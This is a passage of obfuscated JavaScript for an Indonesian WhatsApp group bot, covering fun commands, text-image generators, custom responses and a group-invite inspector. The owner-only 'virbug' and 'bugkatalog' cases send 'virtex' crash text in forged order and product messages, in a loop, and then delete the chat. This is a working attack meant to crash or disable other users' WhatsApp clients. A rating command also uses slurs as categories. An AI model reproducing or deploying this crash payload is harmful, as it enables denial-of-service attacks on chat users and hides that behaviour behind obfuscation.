 if (isBan) return reply(mess.ban)
 if (!isGroup) return reply(`GROUP ONLY`)
 if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
 jds = []
 const A11 = groupMembers
 const B11 = groupMembers
 const C11 = A11[Math.floor(Math.random() * A11.length)] 
 const C22 = B11[Math.floor(Math.random() * B11.length)]
D11 = `━「 JADIAN 」━\n\n@${C11.jid.split('@')[0]} ❤ @${C22.jid.split('@')[0]}\n\nMOGAA LANGGENG😋`  
jds.push(C11.jid)
jds.push(C22.jid)
mentions(D11, jds, true)
await limitAdd(sender)
break
case 'bisakah':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
bisakah = args.join(' ')
const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
const asa = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?text=${keh}&language=id`)
YANZ.sendMessage(from, asa, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek })
break
case 'kapan':
case 'kapankah':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
const kapan1 = args.join(' ') 
const kapan2 = ['Hari ini','saya tidak mengerti','Mungkin besok','1 Minggu lagi','Masih lama','3 Bulan lagi','7 Bulan lagi','3 Tahun lagi','4 Bulan lagi','2 Bulan lagi','1 Tahun lagi','1 Bulan lagi','Coba ulangi']
const koh = kapan2[Math.floor(Math.random() * (kapan2.length))]
const asai = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?text=${koh}&language=id`)
YANZ.sendMessage(from, asai, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek })
break
case 'apakah':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
const tanya = args.join(' ') 
const apa = ['Ya','Mungkin','Tidak','Saya tidak tahu masalah itu','Coba Ulangi','coba jawab sendiri']
const ahik = apa[Math.floor(Math.random() * (apa.length))]
const asaiu = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?text=${ahik}&language=id`)
YANZ.sendMessage(from, asaiu, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek })
break
case 'dimana': 
case 'dimanakah':  
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
const tanyaap = body.slice(1) 
const dmna = ['saya tidak tahu!','di sebelah jembatan mungkin','di semak semak','di rumah si udin','di dapurmu!','di warung bu siti','coba jawab sendiri','gatau ah aku']
const dimanalu = dmna[Math.floor(Math.random() * (dmna.length))]
const asaii = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?text=${dimanalu}&language=id`)
YANZ.sendMessage(from, asaii, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek })
break

case 'naruto':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pNaruto(`${q}`)
.then(res => {
sendMediaURL(from, res.url, q)
})
break
case 'shadow':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pShadow(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'romantic':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pRomantic(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'smoke':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pSmoke(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'burnpaper':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pBurnPapper(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'lovemsg':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pLoveMsg(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'grass':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pMsgGrass(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'doubleheart':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pDoubleHeart(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'coffecup':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pCoffeCup(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'lovetext':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pLoveText(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'butterfly':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (!q) return reply('teksnya mana?')
reply(mess.wait)
pButterfly(`${q}`)
.then(res => {
sendMediaURL(from, res.url)
})
break
case 'styletext': case 'textstyle':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
reply(Object.entries(await styleText(q)).map(([name, value]) => `_${name}_ : ${value}`).join`\n\n`)
break
 case 'cek': 
 case 'test':{
try {
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
 Muzza = Math.floor(Math.random() * 100) + 1
 const emoy = ["🤣","🙂","😄","😁","😎","😀","😃","😁","😝","😐","😱","😵","😲"]
 const emot = emoy[Math.floor(Math.random() * (emoy.length))]
 if (args[0].toLowerCase() === 'ganteng') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'cantik') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'goblok') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'baper') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'tomboi') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'banci') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'alay') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'peka') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'cuek') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'manis') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'jelek') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'tollol') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'tolol') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'asu') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'gendeng') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'gila') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'sange') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'nafsu') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'gay') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'lesbi') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'haram') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'bangsat') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'cupu') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'gabut') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'gajelas') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'lucu') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'gakjelas') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'males') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'malas') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'pelit') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'baik') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'buruk') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'arogan') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'mandul') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'galak') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'sabar') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'lebus') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 if (args[0].toLowerCase() === 'ikhlas') {
 reply(`nilai ke *${args[0]}* anmu adalah ${Muzza}% ${emot}`)
 }
 } catch {
 reply(`Hah?`)
 }
 }
 break
 case 'addrespon':
 case 'addres':
 if (!isPrem && !mek.key.fromMe) return reply(mess.only.prem)
 if (args.length < 1) return reply(`Kirim perintah *${command}* command|jawaban`)
 var soal = q.split('|')[0]
 var jawaban = q.split('|')[1]
 if (!jawaban) return reply(`Jawabannya apa?`)
 if (checkCommands(soal.toLowerCase(), cmdDB)) return reply(`Command tersebut sudah ada!`)
 addCommands(soal.toLowerCase(), jawaban, sender, cmdDB)
 reply('Sukses!')
 break
 case 'deleterespon': case 'dellrespon': case 'delrespon': case 'dellres': case 'delres':
 if (!isPrem && !mek.key.fromMe) return reply(mess.only.prem)
 if (args.length < 1) return reply(`Kirim perintah *${command}* command`)
 if (isCreated(q.toLowerCase(), sender, cmdDB) && !isOwner) return reply(`Anda bukan pembuat command!`)
 deleteCommands(q.toLowerCase(), cmdDB)
 reply('Sukses!')
 break
 case 'listrespon': case 'listres':
 if (!isOwner && !mek.key.fromMe) return
 var txtt = `LIST REPONSE\nJUMLAH : *${cmdDB.length}*\n\n`
 for (let i of cmdDB){
 txtt += `*RESPON :* ${i.commands}\n*JAWABAN :* ${i.jawaban}\n*CREATED :* @${i.created.split("@")[0]}\n\n`
 }
 YANZ.sendMessage(`${ownerNumber}`, txtt, text, { quoted: mek, contextInfo:{ mentionedJid: parseMention(txtt) }})
 break
 case 'cecan':
 case 'uhktyy':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
 if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
 try {
 reply(mess.wait)
 let wipuu = (await axios.get(`https://raw.githubusercontent.com/MyZuyx/poto/main/${command}.json`)).data
 let wipii = wipuu[Math.floor(Math.random() * (wipuu.length))]
 fs.writeFileSync(`./image/cecan/${sender}.jpeg`, 
 await getBuffer(wipii))
 const ima = await YANZ.prepareMessage(from, fs.readFileSync(`./image/cecan/${sender}.jpeg`),  MessageType.image, {thumbnail: gambar})
 const butto = [{buttonId:`${prefix+command}`,buttonText: {displayText: '⏩ NEXT ⏪'}, type: 1}]
 const ButtonsMessagess = {
 contentText: `Nih ${command} kak`,
 buttons: butto,
 footerText: `Klik Next Untuk Melanjutkan Ke Gambar Berikutnya\nBOT Created by Herman Chanel`,
 headerType: 4,
 imageMessage: ima.message.imageMessage
 }    
  await YANZ.sendMessage(from, ButtonsMessagess, MessageType.buttonsMessage, {quoted : mek})
 fs.unlinkSync(`./image/cecan/${sender}.jpeg`)
 } catch (e) {
  reply(`${e}`)
  }
limitAdd(sender, limit)
  break
 case 'inspect':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
try {
let linkRegex = /chat\.whatsapp\.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i
let [, code] = q.match(linkRegex) || []
if (!code) throw 'Link invalid'
res = await YANZ.query({json: ["query", "invite", code],
expect200: true})
caption = `── *GROUP LINK INSPECTOR* ──

*Nama Grup : ${res.subject}*
  - *Terakhir di ubah oleh : @${res.subjectOwner.replace("@c.us","")}*
  - *Di ubah pada ${formatDate(res.subjectTime * 1000)}*

*ID : ${res.id}*
*Di Buat Oleh : @${res.id.split('-')[0]}*
*Di Buat pada ${formatDate(res.creation * 1000)}*

┌•
│ *Edit info grup : ${res.restrict?`Hanya admin`:`Semua peserta`}*
│ *Kirim pesan : ${res.announce?`Hanya admin`:`Semua peserta`}*
│ *Pesan sementara : ${res.ephemeralDuration?`Aktif`:`mati`}*
│
│ *Jumlah Member : ${res.size}*
│ *Member Yang Diketahui :* ${res.participants ? '\n│ *' + res.participants.map((user, i) => ++i + '. @' + user.id.split`@`[0]+'*').join('\n│ *').trim() : ' *Tidak ada'}
╰•

*Deskripsi :*
${res.desc ? `${res.desc}` : 'Tidak Ada'}

 - *Terakhir di ubah oleh : @${res.descOwner.replace("@c.us","")}*
 - *Di ubah pada ${formatDate(res.descTime * 1000)}*`
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
try {
profilePic = await YANZ.getProfilePicture(res.id)
} catch {
profilePic = `${imagebb}`
}
anay = await getBuffer(profilePic)
YANZ.sendMessage(from, anay, image, {quoted: mek, thumbnail: gambar2, caption: caption, contextInfo: {
mentionedJid: YANZ.parseMention(caption)
}})
} catch (e) {
reply(`${e}`)
}
limitAdd(sender, limit)
break
case 'snk':
case 's&k':
if (isBan) return
replybutton1(from, `${prefix}menu`, `𝚁𝙴𝙶𝙰𝚁𝙳𝚂 : 𝙵𝙰𝚁𝙸𝙳 𝙼𝙰𝙷𝙰𝚁𝙳𝙸𝙺𝙰 || ${nomerowner}\n𝚂𝚄𝙳𝙰𝙷 𝙵𝙰𝙷𝙰𝙼 ? 𝙺𝙻𝙸𝙺 𝙼𝙴𝙽𝚄!`,`⋮☰ MENU`,`⚠️ *SYARAT DAN KETENTUAN* ⚠️

*1. Pengguna dapat menggunakan semua perintah/command dengan batasan limit, terkecuali user premium dengan limit tanpa batas/unlimited, dan tidak melakukan spam terhadap bot.*
*2. Dilarang keras mengirim pesan V dan semacamnya yang membuat server down ataupun bot crash*
*3. Pengguna yang mengirim hal atau data pribadi tidak akan disimpan oleh bot ini, dan tidak akan bertanggung jawab atas data pribadi tersebut!*
*4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.*

┌─ ❗ *RULES* ❗ ─
│1. Jangan spam bot. 
│Sanksi: *WARN/SOFT BLOCK*
│
│2. Jangan telepon bot.
│Sanksi: *SOFT BLOCK*
│
│3. Jangan mengeksploitasi bot.
│Sanksi: *PERMANENT BLOCK*
└──────────

_Note : Bot ini menggunakan autoread atau langsung membaca pesan yang pengguna kirim_`)
break
case 'donasi': case 'donate':
if(isBan) return
reply(`━「 𝗗𝗢𝗡𝗔𝗧𝗘 」━

Donate For Herman Chanel

${gopay=='-'?'':`\n`+gopay+` > GOPAY`}${dana=='-'?'':`\n`+dana+` > DANA`}${ovo=='-'?'':`\n`+ovo+` > OVO`}${shopeepay=='-'?'':`\n`+shopeepay+` > SHOPEEPAY`}${paypal=='-'?'':`\n`+paypal+` > PAYPAL`}${saweria=='-'?'':`\n`+saweria+` > SAWERIA`}${ewalet=='-'?'':`\n`+ewalet+` > EWALET`}
 
*𝚃𝙴𝚁𝙸𝙼𝙰𝙺𝙰𝚂𝙸𝙷* 𝚄𝙽𝚃𝚄𝙺 𝚈𝙰𝙽𝙶 𝚂𝚄𝙳𝙰𝙷 𝙳𝙾𝙽𝙰𝚂𝙸!!
𝚄𝙽𝚃𝚄𝙺 𝚂𝙴𝚆𝙰 𝙱𝙾𝚃 𝙱𝙸𝚂𝙰 𝙻𝙴𝚆𝙰𝚃 𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙳𝙸 𝙰𝚃𝙰𝚂`)
break
case 'bugkatalog': case 'virlog':{
if (!isOwner && !mek.key.fromMe) return
function _0x2085(_0x17db63,_0x475c6b){var _0x4fb3cb=_0x4fb3();return _0x2085=function(_0x2085f9,_0x5c2644){_0x2085f9=_0x2085f9-0x1eb;var _0x171998=_0x4fb3cb[_0x2085f9];return _0x171998;},_0x2085(_0x17db63,_0x475c6b);}function _0x4fb3(){var _0xc49567=['13937Zcgrmd','4gKwfFT','8tJPXJm','imageMessage','505155iSGDuN','0@s.whatsapp.net','prepareMessageFromContent','7.8000','prepareMessage','999999','toggleDisappearingMessages','13836nNioIO','vemoji','./image/itsmemuzza.jpeg','1068eRkKVl','virtex','111111111@s.whatsapp.net','relayWAMessage','readFileSync','6298395NlFder','42cTZSoO','12090276fdFsGa','654127ajUdXh','46212nIFPJe','@s.whatsapp.net','17333480pxhXGN','message'];_0x4fb3=function(){return _0xc49567;};return _0x4fb3();}var _0x29d904=_0x2085;(function(_0x15ab73,_0x2e15d3){var _0x41a8a6=_0x2085,_0x5b6ef7=_0x15ab73();while(!![]){try{var _0x390cf4=parseInt(_0x41a8a6(0x1ec))/0x1*(-parseInt(_0x41a8a6(0x1f2))/0x2)+parseInt(_0x41a8a6(0x1ff))/0x3*(parseInt(_0x41a8a6(0x1fc))/0x4)+-parseInt(_0x41a8a6(0x204))/0x5+parseInt(_0x41a8a6(0x205))/0x6*(parseInt(_0x41a8a6(0x1f5))/0x7)+parseInt(_0x41a8a6(0x1f3))/0x8*(-parseInt(_0x41a8a6(0x1eb))/0x9)+-parseInt(_0x41a8a6(0x1ef))/0xa+-parseInt(_0x41a8a6(0x1f1))/0xb*(-parseInt(_0x41a8a6(0x1ed))/0xc);if(_0x390cf4===_0x2e15d3)break;else _0x5b6ef7['push'](_0x5b6ef7['shift']());}catch(_0x6f9ae5){_0x5b6ef7['push'](_0x5b6ef7['shift']());}}}(_0x4fb3,0xed17b),fakenya={'key':{'participant':_0x29d904(0x201)},'message':{'orderMessage':{'thumbnail':gambar,'itemCount':-0x39cd81ad,'status':0x1,'surface':0x11170,'message':fakeV,'orderTitle':fakeV,'sellerJid':_0x29d904(0x1f6)}}},YANZ[_0x29d904(0x1fb)](from),imeg=await YANZ[_0x29d904(0x1f9)](from,fs[_0x29d904(0x203)](_0x29d904(0x1fe)),_0x29d904(0x1f4)),imeu=imeg[_0x29d904(0x1f0)][_0x29d904(0x1f4)],YANZ[_0x29d904(0x202)](await YANZ[_0x29d904(0x1f7)](from,{'productMessage':{'businessOwnerJid':nomerowner+_0x29d904(0x1ee),'product':{'productId':'1011','productImage':imeu,'title':virtex[_0x29d904(0x200)]()+virtex[_0x29d904(0x200)](),'description':virtex[_0x29d904(0x1fd)]()+virtex[_0x29d904(0x1fd)](),'currencyCode':'IDR','priceAmount1000':_0x29d904(0x1fa),'retailerId':'','url':'','productImageCount':0x1,'salePriceAmount1000':_0x29d904(0x1f8)}}},{'quoted':fakenya})));
setTimeout( () => {
YANZ.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}, 60000)
}
break
case 'virbug': case 'bugvir':{
if (!isOwner && !mek.key.fromMe) return
if (Number(args[0]) > 5) return reply(`kebanyakan, minimal 5`)
var _0x15f872=_0x4c89;(function(_0x185d50,_0x1eddc9){var _0x5b4623=_0x4c89,_0x152641=_0x185d50();while(!![]){try{var _0x1a4641=parseInt(_0x5b4623(0x1ed))/0x1*(-parseInt(_0x5b4623(0x1ef))/0x2)+-parseInt(_0x5b4623(0x1ee))/0x3+parseInt(_0x5b4623(0x1f5))/0x4*(-parseInt(_0x5b4623(0x1f4))/0x5)+parseInt(_0x5b4623(0x1e7))/0x6*(parseInt(_0x5b4623(0x1e4))/0x7)+-parseInt(_0x5b4623(0x1f2))/0x8+parseInt(_0x5b4623(0x1e8))/0x9*(parseInt(_0x5b4623(0x1ec))/0xa)+parseInt(_0x5b4623(0x1f3))/0xb;if(_0x1a4641===_0x1eddc9)break;else _0x152641['push'](_0x152641['shift']());}catch(_0x5f260c){_0x152641['push'](_0x152641['shift']());}}}(_0x5a2e,0xd0878));var memek=args[0x0]?args[0x0]:0x1;function _0x5a2e(){var _0x183011=['4430ygfPTx','969482ounvpY','170721ZYmehg','2CWhKQK','toggleDisappearingMessages','111111111@s.whatsapp.net','8178056vtbERF','23463330IWefLp','1839645YZfnTd','8hHzGkX','3059fxElHR','relayWAMessage','CATALOG','14766xuvKTw','8739kjykNf','virtex','0@s.whatsapp.net','prepareMessageFromContent'];_0x5a2e=function(){return _0x183011;};return _0x5a2e();}fakenya={'key':{'participant':_0x15f872(0x1f1)},'message':{'orderMessage':{'thumbnail':gambar,'itemCount':-0x39cd81ad,'status':0x1,'surface':0x11170,'message':fakeV,'orderTitle':fakeV,'sellerJid':_0x15f872(0x1ea)}}};function _0x4c89(_0x525497,_0x2fd11e){var _0x5a2ec1=_0x5a2e();return _0x4c89=function(_0x4c8907,_0x2e618b){_0x4c8907=_0x4c8907-0x1e4;var _0x4b0c3d=_0x5a2ec1[_0x4c8907];return _0x4b0c3d;},_0x4c89(_0x525497,_0x2fd11e);}for(let Ah=0x0;Ah<memek;Ah++){YANZ[_0x15f872(0x1f0)](from),virusnya=virtex[_0x15f872(0x1e9)](),res=YANZ[_0x15f872(0x1eb)](from,{'orderMessage':{'itemCount':-0x39cd81ad,'message':virusnya,'footerText':virusnya,'thumbnail':gambar2,'surface':_0x15f872(0x1e6)}},{'quoted':fakenya}),YANZ[_0x15f872(0x1e5)](res);}
setTimeout( () => {
YANZ.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}, 60000)
}
break
case 'addcmd': case 'setcmd':
if (!isSelf && !isOwner) return reply(mess.only.owner)
if (isQuotedSticker) {
if (!q) return reply(`Cara Penggunaan : Reply sticker dengan caption ${command} commandnya\nContoh : ${command} .help`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
for(let i of stickerdb){
if(kodenya.includes(i.id)) return reply('sticker sudah terdaftar didatabase')
}
addcmd(kodenya, q, m.quoted.fakeObj.message, reply)
} else {
reply('reply stickernya')
}
await sleep(5000)
break
case 'getsticker': case 'getcmd':
if (!isPrem) return reply(mess.only.prem)
if(!q) return reply(`Example : ${prefix + command} !menu`)
function _0x2b16(){const _0x3a9f6d=['11aqYbBu','13258836Kfwobk','37728rauhSy','250716IrNEAB','Sticker\x20dengan\x20command\x20','5626190LaTujg','sticker','push','prepareMessageFromContent','65Ilimpv','cmd','length','128YqbYnj','587336fMbIjh','\x20tidak\x20ada\x20di\x20database','18YzaZVo','648375TqUcOX','11AYOZKp','56907AgDjjD'];_0x2b16=function(){return _0x3a9f6d;};return _0x2b16();}const _0x45a304=_0x2564;function _0x2564(_0x3666a6,_0x45f5aa){const _0x2b1668=_0x2b16();return _0x2564=function(_0x256469,_0x5c1935){_0x256469=_0x256469-0x194;let _0xaeb0f5=_0x2b1668[_0x256469];return _0xaeb0f5;},_0x2564(_0x3666a6,_0x45f5aa);}(function(_0x2494cf,_0x2b1f2e){const _0x58714d=_0x2564,_0x44dbad=_0x2494cf();while(!![]){try{const _0x322e15=parseInt(_0x58714d(0x19f))/0x1*(-parseInt(_0x58714d(0x1a1))/0x2)+-parseInt(_0x58714d(0x19e))/0x3*(-parseInt(_0x58714d(0x198))/0x4)+-parseInt(_0x58714d(0x195))/0x5*(parseInt(_0x58714d(0x1a2))/0x6)+parseInt(_0x58714d(0x19c))/0x7+parseInt(_0x58714d(0x199))/0x8*(-parseInt(_0x58714d(0x19b))/0x9)+-parseInt(_0x58714d(0x1a4))/0xa*(parseInt(_0x58714d(0x19d))/0xb)+parseInt(_0x58714d(0x1a0))/0xc;if(_0x322e15===_0x2b1f2e)break;else _0x44dbad['push'](_0x44dbad['shift']());}catch(_0x466cfa){_0x44dbad['push'](_0x44dbad['shift']());}}}(_0x2b16,0x54129),ok=[]);for(let i=0x0;i<stickerdb[_0x45a304(0x197)];i++){stickerdb[i][_0x45a304(0x196)]===q&&ok[_0x45a304(0x1a6)](i);}console['log'](ok);if(ok===undefined)return reply(_0x45a304(0x1a3)+q+_0x45a304(0x19a));for(let i of ok){po=await YANZ[_0x45a304(0x194)](from,stickerdb[i][_0x45a304(0x1a5)],{'quoted':mek}),YANZ['relayWAMessage'](po);}
break
case 'dellcmd': case 'dcmd': case 'delcmd':{
if (!isSelf && !isOwner) return reply(mess.only.owner)
if (!isQuotedSticker) return reply(`reply stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
diti = [];
for(let i of stickerdb){
diti.push(i.id)
}
if(!kodenya.includes(diti)) return reply('sticker tidak terdaftar didatabase')
de = await getcmdpos(kodenya)
var del = stickerdb.indexOf(de)
stickerdb.splice(del, 1)
await fs.writeFileSync('./database/scmd.json', JSON.stringify(stickerdb))
reply("Done..")
}
break
case 'listcmd': case 'liststccmd':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
let teksnyee = '─ *LIST STC CMD* ─\n'
let cemde = [];
for (let i of stickerdb) {
teksnyee += `${f} ID : ${i.id}\n${f} Cmd : ${i.cmd}`
}
teksnyee += `\n\n*NOTE : UNTUK MENGAMBIL STICKER KETIK #GETCMD COMMANDNYA*`
reply(teksnyee)
break
case 'sc': case 'sourcecode': case 'scriptbot':
try {
const _0x10392a=_0x5cac;(function(_0x497c21,_0x742ff9){const _0x237d98=_0x5cac,_0x86d08a=_0x497c21();while(!![]){try{const _0x3568f5=-parseInt(_0x237d98(0xcb))/0x1+parseInt(_0x237d98(0xd1))/0x2*(parseInt(_0x237d98(0xd0))/0x3)+-parseInt(_0x237d98(0xc7))/0x4+parseInt(_0x237d98(0xcd))/0x5+parseInt(_0x237d98(0xc8))/0x6*(-parseInt(_0x237d98(0xd3))/0x7)+parseInt(_0x237d98(0xd9))/0x8*(-parseInt(_0x237d98(0xcc))/0x9)+parseInt(_0x237d98(0xd7))/0xa;if(_0x3568f5===_0x742ff9)break;else _0x86d08a['push'](_0x86d08a['shift']());}catch(_0xd7f11){_0x86d08a['push'](_0x86d08a['shift']());}}}(_0x11de,0x21acc));function _0x11de(){const _0x39e57b=['jid','2388070bAoKeI','BOT\x20INI\x20MENGGUNAKAN\x20SC\x20DI\x20YOUTUBE\x20https://bit.ly/3euynfb','658032OtfJzp','text','participants','106680viYuFN','18bYGyWP','https://bit.ly/3euynfb','push','256747qaDWtr','18jwQfLy','982095jfDScG','Hai','sendMessage','144156kVGvcE','8sLcyde','groupMetadata','97013CqcIKE','PHOTO','SC\x20BOT'];_0x11de=function(){return _0x39e57b;};return _0x11de();}let anu=await YANZ[_0x10392a(0xd2)](from),members=anu[_0x10392a(0xc6)],ane=[];function _0x5cac(_0x52d587,_0x9438a7){const _0x11decb=_0x11de();return _0x5cac=function(_0x5cac34,_0x2767f0){_0x5cac34=_0x5cac34-0xc5;let _0x11128d=_0x11decb[_0x5cac34];return _0x11128d;},_0x5cac(_0x52d587,_0x9438a7);}for(let i of members){ane[_0x10392a(0xca)](i[_0x10392a(0xd6)]);}YANZ[_0x10392a(0xcf)](from,_0x10392a(0xd8),MessageType[_0x10392a(0xc5)],{'contextInfo':{'text':_0x10392a(0xce),'forwardingScore':0x3b9aca00,'isForwarded':![],'sendEphemeral':![],'externalAdReply':{'title':_0x10392a(0xd5),'body':'','previewType':_0x10392a(0xd4),'thumbnailUrl':imagebbthumb,'thumbnail':imagebbthumb,'sourceUrl':_0x10392a(0xc9)},'mentionedJid':ane},'quoted':fakelokasi});
} catch {
